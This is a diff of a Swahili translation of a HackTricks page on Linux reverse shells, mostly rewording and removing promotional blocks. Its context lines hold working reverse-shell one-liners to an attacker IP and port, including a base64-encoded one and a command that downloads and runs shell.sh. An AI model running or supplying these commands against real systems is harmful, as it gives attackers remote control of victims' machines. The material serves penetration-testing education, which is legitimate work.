@@ -15,14 +15,6 @@ Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" al
 </details>
 {% endhint %}
 
-**Kundi la Usalama wa Jaribio**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 **Ikiwa una maswali kuhusu yoyote ya hizi shells unaweza kuangalia na** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
@@ -44,7 +36,7 @@ exec >&0
 ```
 Usisahau kuangalia na shell nyingine: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, na bash.
 
-### Shell salama ya alama
+### Symbol salama shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -56,19 +48,19 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Maelezo ya Shell
 
 1. **`bash -i`**: Sehemu hii ya amri inaanzisha shell ya Bash ya kuingiliana (`-i`).
-2. **`>&`**: Sehemu hii ya amri ni alama ya kifupi ya **kuhamasisha pato la kawaida** (`stdout`) na **kosa la kawaida** (`stderr`) kwenda **mahali pamoja**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Hii ni faili maalum ambayo **inaakisi muunganisho wa TCP kwa anwani ya IP na bandari iliyoainishwa**.
-* Kwa **kuhamasisha pato na mwelekeo wa makosa kwenda kwenye faili hii**, amri hiyo kwa ufanisi inatuma pato la kikao cha shell ya kuingiliana kwenye mashine ya mshambuliaji.
-4. **`0>&1`**: Sehemu hii ya amri **inaelekeza pembejeo ya kawaida (`stdin`) kwenda kwenye mahali pamoja na pato la kawaida (`stdout`)**.
+2. **`>&`**: Sehemu hii ya amri ni alama ya kifupi ya **kupeleka pato la kawaida** (`stdout`) na **kosa la kawaida** (`stderr`) kwa **mahali pamoja**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Hii ni faili maalum ambayo **inaonyesha muunganisho wa TCP kwa anwani ya IP na bandari iliyoainishwa**.
+* Kwa **kupeleka pato na mstreams ya makosa kwa faili hii**, amri hiyo kwa ufanisi inatuma pato la kikao cha shell ya kuingiliana kwa mashine ya mshambuliaji.
+4. **`0>&1`**: Sehemu hii ya amri **inaelekeza ingizo la kawaida (`stdin`) kwa mahali sawa na pato la kawaida (`stdout`)**.
 
-### Unda kwenye faili na utekeleze
+### Unda katika faili na utekeleze
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Wakati wa kushughulikia **Remote Code Execution (RCE)** udhaifu ndani ya programu ya wavuti inayotumia Linux, kupata reverse shell kunaweza kuzuia na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti ngumu. Katika mazingira kama haya, njia mbadala ni kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo ulioathirika kwa ufanisi zaidi.
+Wakati unashughulikia **Remote Code Execution (RCE)** udhaifu ndani ya programu ya wavuti inayotumia Linux, kupata reverse shell kunaweza kuzuia na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti ngumu. Katika mazingira kama haya, njia mbadala ni kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo ulioathirika kwa ufanisi zaidi.
 
 Zana inayopendekezwa kwa ajili ya hili ni [toboggan](https://github.com/n3rada/toboggan.git), ambayo inarahisisha mwingiliano na mazingira ya lengo.
 
@@ -340,23 +332,17 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**Jaribu Kikundi cha Usalama**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
